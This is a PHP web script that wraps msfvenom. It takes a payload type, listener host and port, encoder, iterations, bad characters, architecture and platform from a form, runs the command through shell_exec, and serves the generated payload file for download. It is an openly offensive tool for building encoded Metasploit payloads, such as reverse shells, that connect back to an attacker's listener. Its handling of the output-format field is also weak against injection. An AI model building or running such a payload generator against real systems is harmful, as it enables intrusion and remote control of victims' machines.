<?php
ob_start(); // Start output buffering

if ($_SERVER["REQUEST_METHOD"] === "POST") {
    // Define error log file
    $error_log_file = "/home/dum1ya/Desktop/payload_debug.log";
    
    function log_error($message) {
        global $error_log_file;
        file_put_contents($error_log_file, date("Y-m-d H:i:s") . " - " . $message . "\n", FILE_APPEND);
    }

    // Validate and sanitize inputs
    $payload_type = escapeshellarg($_POST['payload-type']);
    $lhost = escapeshellarg($_POST['lhost']);
    $lport = escapeshellarg($_POST['lport']);
    $output_format = escapeshellarg($_POST['output-format']);
    $encoder = escapeshellarg($_POST['encoder']);
    $iterations = (int)$_POST['iterations']; // Ensure integer
    $bad_chars = escapeshellarg($_POST['bad-chars']);
    $architecture = escapeshellarg($_POST['architecture']);
    $platform = escapeshellarg($_POST['platform']);

    // Validate LHOST and LPORT
    if (!filter_var(trim($_POST['lhost']), FILTER_VALIDATE_IP)) {
        log_error("Invalid LHOST IP address: " . $_POST['lhost']);
        die("Invalid LHOST IP address.");
    }
    if (!is_numeric($_POST['lport']) || $_POST['lport'] <= 0 || $_POST['lport'] > 65535) {
        log_error("Invalid LPORT number: " . $_POST['lport']);
        die("Invalid LPORT number.");
    }

    // Define output file with absolute path
    $output_file = "/home/dum1ya/Desktop/payload." . escapeshellcmd($_POST['output-format']);

    // Construct msfvenom command
    $command = "msfvenom -p $payload_type LHOST=$lhost LPORT=$lport ";
    if (!empty($_POST['encoder'])) {
        $command .= "-e $encoder ";
    }
    if ($iterations > 0) {
        $command .= "-i $iterations ";
    }
    if (!empty($_POST['bad-chars'])) {
        $command .= "-b $bad_chars ";
    }
    $command .= "-a $architecture --platform $platform -f $output_format -o $output_file";

    // Log command execution
    log_error("Executing command: $command");

    // Execute command and capture output
    $output = shell_exec("$command 2>&1");
    log_error("Command output: " . $output);

    // Verify file creation
    if (!file_exists($output_file)) {
        log_error("File does not exist: $output_file");
        die("File does not exist.");
    }
    if (!is_readable($output_file)) {
        log_error("File is not readable: $output_file");
        die("File is not readable.");
    }

    log_error("Payload generated successfully: $output_file");

    // Provide file for download
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="' . basename($output_file) . '"');
    header('Content-Length: ' . filesize($output_file));

    // Debugging: Check if headers are sent
    if (headers_sent()) {
        log_error("Headers already sent. Cannot download file.");
        die("Headers already sent. Cannot download file.");
    }

    // Send the file
    readfile($output_file);

    // Cleanup: Delete file after download
    unlink($output_file);
    log_error("Payload file deleted after download.");
    exit;
}
?>
